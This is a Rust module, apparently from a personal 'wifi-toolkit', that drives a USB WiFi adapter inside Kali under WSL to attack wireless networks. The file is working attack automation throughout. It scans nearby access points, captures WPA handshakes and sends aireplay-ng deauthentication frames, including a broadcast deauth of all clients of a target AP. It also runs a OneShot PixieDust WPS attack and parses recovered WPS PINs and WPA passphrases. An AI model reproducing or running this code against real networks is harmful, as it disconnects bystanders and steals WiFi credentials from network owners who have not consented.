//! WSL/Kali hardware-attack integration: Tenda U2 (AIC8800DC) USB adapter.
//!
//! Flow: usbipd attach -> (fake-CD eject -> re-attach) -> monitor mode ->
//! scan/capture/pixiedust, all executed inside kali-linux WSL as root.
//! Capture files are written straight to the Windows logs/caps dir via /mnt/e.

use anyhow::{bail, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Duration;

pub const USBIPD: &str = r"C:\Program Files\usbipd-win\usbipd.exe";

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum AdapterMode {
    Msc,   // fake CD-ROM (a69c:5721), needs eject switch
    Wlan,  // WiFi mode (2604:0014 AIC8800DC)
}

#[derive(Debug, Clone, Serialize)]
pub struct AdapterInfo {
    pub busid: String,
    pub mode: AdapterMode,
    pub shared: bool,
    pub attached: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct Ap {
    pub bssid: String,
    pub channel: String,
    pub power: i32,
    pub essid: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PixieOut {
    pub bssid: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub essid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pin: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub psk: Option<String>,
    #[serde(default)]
    pub time: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signal: Option<i32>,
    #[serde(default)]
    pub tail: String,
}

fn decode_utf8(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

fn run(prog: &str, args: &[&str]) -> Result<String> {
    let out = Command::new(prog).args(args).output()?;
    Ok(format!("{}{}", decode_utf8(&out.stdout), decode_utf8(&out.stderr)))
}

/// usbipd list -> first matching AIC adapter (MSC or WLAN mode).
/// Only the "Connected:" section is scanned: the "Persisted:" section lists
/// GUIDs of old binds and would otherwise match "AIC8800DC" and produce a
/// bogus adapter entry (GUID as busid, attached=false).
pub fn adapter() -> Option<AdapterInfo> {
    let out = run(USBIPD, &["list"]).ok()?;
    let mut busid = None;
    let mut mode = None;
    let mut shared = false;
    let mut attached = false;
    let mut in_connected = false;
    for line in out.lines() {
        if line.starts_with("Connected:") {
            in_connected = true;
            continue;
        }
        if line.starts_with("Persisted:") {
            break;
        }
        if !in_connected {
            continue;
        }
        let is_msc = line.contains("a69c:5721");
        let is_wlan = line.contains("2604:0014") || line.to_lowercase().contains("aic8800");
        if !(is_msc || is_wlan) {
            continue;
        }
        busid = line.split_whitespace().next().map(|s| s.to_string());
        mode = Some(if is_msc { AdapterMode::Msc } else { AdapterMode::Wlan });
        shared = line.contains("Shared") && !line.contains("Not shared");
        attached = line.contains("Attached");
        break;
    }
    Some(AdapterInfo { busid: busid?, mode: mode?, shared, attached })
}

/// Attach to WSL. When the device is not shared, auto-elevate (UAC popup)
/// a PowerShell that binds + attaches, mirroring the manual setup.
pub fn attach(info: &AdapterInfo) -> Result<()> {
    if info.attached {
        return Ok(());
    }
    if !info.shared {
        // elevated bind+attach (UAC confirmation is part of the flow)
        let script = format!(
            "usbipd bind --busid {}; usbipd attach --wsl --busid {}",
            info.busid, info.busid
        );
        let st = Command::new("powershell")
            .args([
                "-NoProfile",
                "-Command",
                &format!(
                    "Start-Process powershell -Verb RunAs -Wait -ArgumentList '-Command','{}'",
                    script.replace('\'', "''")
                ),
            ])
            .output()?;
        if !st.status.success() {
            bail!("提升权限执行 bind/attach 失败（UAC 被取消？）");
        }
    } else {
        let st = Command::new(USBIPD)
            .args(["attach", "--wsl", "--busid", &info.busid])
            .output()?;
        if !st.status.success() {
            bail!(
                "usbipd attach 失败: {}",
                decode_utf8(&st.stderr)
            );
        }
    }
    std::thread::sleep(Duration::from_secs(3));
    Ok(())
}

/// Run a shell snippet inside the Kali WSL distro as root (UTF-8 output).
pub fn kali(distro: &str, script: &str) -> Result<String> {
    // wsl.exe re-quotes its command line, mangling nested quotes in complex
    // scripts. Base64 the payload and decode inside — quote-proof.
    let b64 = {
        use std::io::Write as _;
        let mut b64 = String::new();
        let engine = base64::engine::general_purpose::STANDARD;
        use base64::Engine as _;
        b64.push_str(&engine.encode(script));
        b64
    };
    let out = Command::new("wsl.exe")
        .args([
            "-d", distro, "-u", "root", "--", "bash", "-c",
            &format!("echo {b64} | base64 -d | bash"),
        ])
        .output()?;
    // stdout only: WSL prints PATH-translation warnings to stderr which would
    // otherwise contaminate parsed output.
    Ok(decode_utf8(&out.stdout))
}

/// Kali-side: eject the fake CD-ROM so the adapter re-enumerates as WLAN.
pub fn eject_msc(distro: &str) -> Result<bool> {
    let script = r#"
dev=$(ls -l /dev/disk/by-id/ 2>/dev/null | grep -i AIC | grep -v part | awk '{print $NF}' | xargs -n1 basename | head -1)
if [ -z "$dev" ]; then echo NO_MSC; exit 0; fi
umount /dev/${dev}1 2>/dev/null
eject /dev/$dev && echo EJECTED || echo EJECT_FAIL
"#;
    let out = kali(distro, script)?;
    if out.contains("NO_MSC") {
        return Ok(false);
    }
    // "unable to eject" from the eject utility is common yet the SCSI switch
    // still fires — treat it as success and let the caller wait for re-enum.
    Ok(true)
}

/// First wlx* interface in Kali, if any.
pub fn find_iface(distro: &str) -> Option<String> {
    let out = kali(distro, "ip -o link show 2>/dev/null | awk -F': ' '/wlx/{print $2; exit}'").ok()?;
    out.lines()
        .rev()
        .map(|l| l.trim().trim_end_matches(':').to_string())
        .find(|l| !l.is_empty() && l.starts_with("wlx"))
}

/// Is the WLAN-mode device visible inside Kali?
pub fn has_device(distro: &str) -> bool {
    kali(distro, "lsusb 2>/dev/null | grep -qi '2604:0014' && echo YES")
        .map(|o| o.contains("YES"))
        .unwrap_or(false)
}

/// Load the aic8800 driver modules (WSL has no udev coldplug, so this is
/// required after every attach / WSL restart).
pub fn load_driver(distro: &str) -> Result<()> {
    // Self-healing: if modprobe fails (modules wiped by an apt operation etc.),
    // redeploy from the E:\WSL\kernelic8800 backup, depmod, retry.
    let script = r#"
# self-heal targets the RUNNING kernel (WSL auto-updates may change it)
modprobe aic8800_fdrv 2>/dev/null && lsmod | grep -q aic8800_fdrv && { echo LOADED; exit 0; }
BK=/mnt/e/WSL/kernel/aic8800
KVER=$(uname -r)
if [ -f "$BK/aic8800_fdrv.ko" ]; then
  mkdir -p /lib/modules/$KVER/kernel/drivers/net/wireless/aic8800
  cp -f $BK/*.ko /lib/modules/$KVER/kernel/drivers/net/wireless/aic8800/
  [ -d /lib/firmware/aic8800DC ] || cp -r $BK/aic8800DC /lib/firmware/
  depmod -a $KVER 2>/dev/null
  modprobe aic8800_fdrv 2>/dev/null && lsmod | grep -q aic8800_fdrv && { echo REDEPLOYED; exit 0; }
fi
echo "LOAD_FAIL: 模块与运行内核 $(uname -r) 不匹配 — WSL 内核可能已自动升级，需要重新编译驱动"
"#;
    let out = kali(distro, script)?;
    if out.contains("LOADED") {
        return Ok(());
    }
    if out.contains("REDEPLOYED") {
        tracing::info!("aic8800 modules redeployed from backup");
        return Ok(());
    }
    bail!("aic8800_fdrv 加载失败（备份也失败）: {}", out.trim());
}

/// Force-detach a stale usbipd attachment (e.g. after WSL VM restart).
pub fn detach(busid: &str) {
    let _ = Command::new(USBIPD).args(["detach", "--busid", busid]).output();
}

/// Eject the fake CD-ROM on the WINDOWS side (Shell COM, no admin needed).
/// After this the adapter re-enumerates in WLAN mode, unclaimed by any driver.
pub fn windows_eject_msc() -> Result<()> {
    let ps = "New-Object -ComObject Shell.Application | Out-Null;               $sh = New-Object -ComObject Shell.Application;               $sh.NameSpace(17).Items() | Where-Object { $_.Name -match 'AIC|aicsemi' } |               ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2";
    let out = Command::new("powershell").args(["-NoProfile", "-Command", ps]).output()?;
    let text = format!("{}{}", decode_utf8(&out.stdout), decode_utf8(&out.stderr));
    let _ = text;
    Ok(())
}

/// Bring the interface up in monitor mode.
pub fn up_monitor(distro: &str, iface: &str) -> Result<()> {
    let script = format!(
        r#"ip link set {i} down 2>/dev/null
o=$(iw dev {i} set type monitor 2>&1)
if [ $? -ne 0 ]; then echo "SETFAIL:$o"; exit 0; fi
for t in 1 2 3 4 5; do ip link set {i} up 2>/dev/null && break; sleep 2; done
ip -o link show {i} 2>/dev/null | grep -o 'UP' | head -1"#,
        i = iface
    );
    let out = kali(distro, &script)?;
    if let Some(line) = out.lines().find(|l| l.starts_with("SETFAIL:")) {
        bail!("切监听失败: {}", &line[8..]);
    }
    if !out.contains("UP") {
        bail!("接口未能 UP（ENOBUFS 竞态？）: {}", out.trim());
    }
    Ok(())
}

/// Active scan sweep via airodump CSV (12s), parsed into an AP list.
pub fn scan_aps(distro: &str, iface: &str) -> Result<Vec<Ap>> {
    let script = format!(
        "rm -f /tmp/wtk_scan*.csv; timeout 13 airodump-ng {i} --band bg -w /tmp/wtk_scan --output-format csv >/dev/null 2>&1; cat /tmp/wtk_scan-01.csv 2>/dev/null",
        i = iface
    );
    let csv = kali(distro, &script)?;
    Ok(parse_ap_csv(&csv))
}

/// Parse airodump-ng CSV (first table only).
pub fn parse_ap_csv(csv: &str) -> Vec<Ap> {
    let mut aps: Vec<Ap> = Vec::new();
    for line in csv.lines() {
        let line = line.trim_end_matches('\r');
        if line.to_uppercase().starts_with("BSSID,") {
            continue; // header row
        }
        let p: Vec<&str> = line.split(',').collect();
        if p.len() < 15 {
            continue;
        }
        let bssid = p[0].trim().to_lowercase();
        // real MAC: 17 chars with colons (skips the CSV header row)
        if bssid.len() != 17 || bssid.matches(':').count() != 5 {
            continue;
        }
        let channel = p[3].trim().to_string();
        let power: i32 = p[8].trim().parse().unwrap_or(-100);
        let essid = p[13].trim().to_string();
        let idlen: i32 = p[12].trim().parse().unwrap_or(-1);
        if idlen == 0 {
            continue; // hidden with zero length
        }
        if aps.iter().any(|a| a.bssid == bssid) {
            continue;
        }
        let essid = if essid.is_empty() { "(隐藏)".into() } else { essid };
        aps.push(Ap { bssid, channel, power, essid });
    }
    // power==0 means "driver didn't report RSSI" — sort those last
    aps.sort_by_key(|a| std::cmp::Reverse(if a.power == 0 { -999 } else { a.power }));
    aps
}

/// Capture a dedicated cap for one BSSID/channel into the Windows caps dir.
/// `caps_dir_win` = E:\project\wifi-toolkit\logs\caps ; name = sanitized essid_bssid4.
/// `caps_dir_win` is the WINDOWS-side directory (E:\...\caps\<session>);
/// verification happens on the Windows side because the WSL 9P dir listing
/// lags/caches negative entries for new files written via /mnt/e.
pub fn capture(distro: &str, iface: &str, bssid: &str, channel: &str, essid: &str, sec: u64, caps_dir_win: &Path) -> Result<String> {
    let safe: String = essid
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
        .collect();
    let b4 = bssid.replace(':', "")[0..4].to_string();
    let name = format!("{}_{}", safe, b4);
    let win_str = caps_dir_win.to_string_lossy().into_owned();
    let d_lin = format!(
        "/mnt/{}{}",
        (win_str.as_bytes()[0] as char).to_lowercase(),
        win_str[2..].replace(std::path::MAIN_SEPARATOR, "/")
    );
    let script = format!(
        "mkdir -p '{d}' && rm -f '{d}/{n}'*.cap && timeout {s} airodump-ng {i} -c {c} --bssid {b} -w '{d}/{n}' --band bg >/dev/null 2>&1",
        d = d_lin,
        n = name,
        s = sec,
        i = iface,
        c = channel,
        b = bssid
    );
    let _ = kali(distro, &script)?;
    // Verify from the WINDOWS side: NTFS sees the file immediately, while
    // the 9P directory listing inside WSL caches negative entries.
    for _ in 0..15 {
        if let Ok(rd) = std::fs::read_dir(caps_dir_win) {
            for e in rd.flatten() {
                let p = e.path();
                let fname = p.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default();
                if p.extension().and_then(|x| x.to_str()) == Some("cap")
                    && fname.starts_with(&name)
                {
                    return Ok(p.to_string_lossy().to_string());
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
    bail!("抓包未产出 cap 文件（{}*.cap）", name)
}

/// Deauth a target AP's clients (requires an injection-capable adapter).
/// client=None -> broadcast deauth to all clients of the AP.
pub fn deauth(distro: &str, iface: &str, bssid: &str, client: Option<&str>, count: u32) -> Result<String> {
    let script = match client {
        Some(c) => format!(
            "timeout 12 aireplay-ng --deauth {n} -a {b} -c {c} {i} 2>&1 | tail -2",
            n = count,
            b = bssid,
            c = c,
            i = iface
        ),
        None => format!(
            "timeout 12 aireplay-ng --deauth {n} -a {b} {i} 2>&1 | tail -2",
            n = count,
            b = bssid,
            i = iface
        ),
    };
    Ok(kali(distro, &script)?.trim().to_string())
}

/// Client MACs associated with `bssid`, parsed from an airodump CSV
/// (station table: col0 = station MAC, col5 = AP BSSID).
pub fn stations_from_csv(csv_path: &Path, bssid: &str) -> Vec<String> {
    let text = match std::fs::read_to_string(csv_path) {
        Ok(t) => t,
        Err(_) => return Vec::new(),
    };
    let mut out: Vec<String> = Vec::new();
    let mut in_station_table = false;
    for line in text.lines() {
        let l = line.trim_end_matches('\r');
        if l.starts_with("Station MAC,") {
            in_station_table = true;
            continue;
        }
        if !in_station_table {
            continue;
        }
        let p: Vec<&str> = l.split(',').collect();
        if p.len() >= 6 {
            let mac = p[0].trim();
            let ap = p[5].trim();
            if mac.matches(':').count() == 5 && ap.eq_ignore_ascii_case(bssid) {
                out.push(mac.to_lowercase());
            }
        }
    }
    out
}

/// Capture with automatic deauth-assist: phase 1 (half duration) ->
/// if no handshake, deauth the AP's clients -> phase 2 (half duration).
/// Returns (cap file, handshake known?).
#[allow(clippy::too_many_arguments)]
pub fn capture_deauth(
    distro: &str,
    iface: &str,
    bssid: &str,
    channel: &str,
    essid: &str,
    sec_total: u64,
    caps_dir_win: &Path,
    acng_bin: &Path,
) -> (Option<String>, Option<bool>) {
    let half = (sec_total / 2).max(30);
    let safe: String = essid
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
        .collect();
    let b4 = bssid.replace(':', "").get(0..4).unwrap_or("0000").to_string();
    let base = format!("{}_{}", safe, b4);

    // phase 1
    match capture(distro, iface, bssid, channel, &format!("{}_p1", essid), half, caps_dir_win) {
        Ok(cap) => {
            if crate::session::check_handshake(acng_bin, Path::new(&cap)) == Some(true) {
                return (Some(cap), Some(true));
            }
        }
        Err(_) => {}
    }
    // find phase-1 csv (same stem) and extract stations
    let stem = format!("{}_p1", {
        let safe: String = essid
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
            .collect();
        safe
    });
    let mut stations: Vec<String> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(caps_dir_win) {
        for e in rd.flatten() {
            let p = e.path();
            let fname = p.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default();
            if fname.starts_with(&stem) && fname.ends_with(".csv") {
                stations = stations_from_csv(&p, bssid);
                break;
            }
        }
    }
    let targets: Vec<Option<String>> = if stations.is_empty() {
        vec![None]
    } else {
        stations.iter().map(|s| Some(s.clone())).collect()
    };
    for st in &targets {
        match deauth(distro, iface, bssid, st.as_deref(), 5) {
            Ok(o) => {
                let snip: String = o.chars().take(60).collect();
                events_note(&format!("deauth({:?}): {}", st, snip));
            }
            Err(e) => events_note(&format!("deauth 失败: {e:#}")),
        }
    }
    // phase 2
    let cap2 = capture(
        distro,
        iface,
        bssid,
        channel,
        &format!("{}_p2", essid),
        half,
        caps_dir_win,
    )
    .ok();
    let hs = cap2
        .as_ref()
        .and_then(|c| crate::session::check_handshake(acng_bin, Path::new(c)));
    (cap2, hs)
}

fn events_note(msg: &str) {
    tracing::info!("{}", msg);
}

/// Run reaver PixieDust against one BSSID; parse PIN / PSK from output.
/// PixieDust via OneShot (wpa_supplicant managed-mode association).
///
/// Deliberately NOT reaver-in-monitor: reaver's injection path has crashed
/// the aic8800 driver under load, taking the whole WSL VM (and Docker
/// Desktop, which shares it) down. OneShot associates normally — the same
/// way it runs on rooted Android — and stresses the driver far less.
pub fn pixie(distro: &str, iface: &str, bssid: &str, timeout_sec: u64) -> Result<PixieOut> {
    let script = format!(
        r#"ip link set {i} down 2>/dev/null
iw dev {i} set type managed 2>&1
ip link set {i} up 2>/dev/null
mkdir -p /var/run/wpa_supplicant
timeout {t}s python3 /opt/OneShot/oneshot.py -i {i} -b {b} -v 2>&1
ip link set {i} down 2>/dev/null
iw dev {i} set type monitor 2>/dev/null
ip link set {i} up 2>/dev/null
echo __ONEShot_DONE__"#,
        t = timeout_sec,
        i = iface,
        b = bssid
    );
    let raw = kali(distro, &script)?;
    // strip ANSI color escapes (oneshot colorizes even when piped)
    let re_ansi = regex::Regex::new(r"\[[0-9;]*m").unwrap();
    let out = re_ansi.replace_all(&raw, "").to_string();

    let mut pin = None;
    let mut psk = None;
    for line in out.lines() {
        let clean = line.trim();
        if pin.is_none() && clean.contains("WPS PIN") {
            if let Some(pos) = clean.find(": ") {
                let v = clean[pos + 2..].trim().trim_matches(|c| c == '\u{27}' || c == '\u{22}').to_string();
                if !v.is_empty() && v != "N/A" {
                    pin = Some(v);
                }
            }
        }
        if psk.is_none() && clean.contains("WPA PSK") {
            if let Some(pos) = clean.find(": ") {
                let v = clean[pos + 2..].trim().trim_matches(|c| c == '\u{27}' || c == '\u{22}').to_string();
                if !v.is_empty() && v != "N/A" {
                    psk = Some(v);
                }
            }
        }
    }
    let tail: String = out
        .lines()
        .rev()
        .take(25)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .map(|l| format!("{}
", l))
        .collect();
    Ok(PixieOut {
        bssid: bssid.to_string(),
        essid: None,
        signal: None,
        pin,
        psk,
        time: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        tail: tail.chars().take(1500).collect(),
    })
}
